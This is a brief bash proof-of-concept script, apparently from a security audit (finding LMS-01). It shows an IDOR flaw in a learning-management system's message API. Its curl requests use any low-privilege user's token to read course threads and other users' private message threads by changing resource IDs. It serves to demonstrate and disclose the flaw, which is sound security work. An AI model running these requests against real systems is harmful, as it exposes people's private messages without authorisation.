#!/usr/bin/env bash
# LMS-01 - IDOR read prong: any authenticated user reads any Course/Lesson/User message thread.
# Placeholders: <BASE_URL> = app base URL, <ANY_VALID_USER_TOKEN> = Passport token of a
# low-privilege user who is NOT enrolled in the target resource.

# Control: no token -> 302 redirect to /login (auth:api is the only gate)
curl -i "<BASE_URL>/api/message?type=Course&resource=1"

# IDOR read: course thread of a course the caller is not enrolled in
curl -s -H "Authorization: Bearer <ANY_VALID_USER_TOKEN>" \
     "<BASE_URL>/api/message?type=Course&resource=1"

# IDOR read (2nd prong): another user's user-scoped thread (resource = victim user id)
curl -s -H "Authorization: Bearer <ANY_VALID_USER_TOKEN>" \
     "<BASE_URL>/api/message?type=User&resource=3"
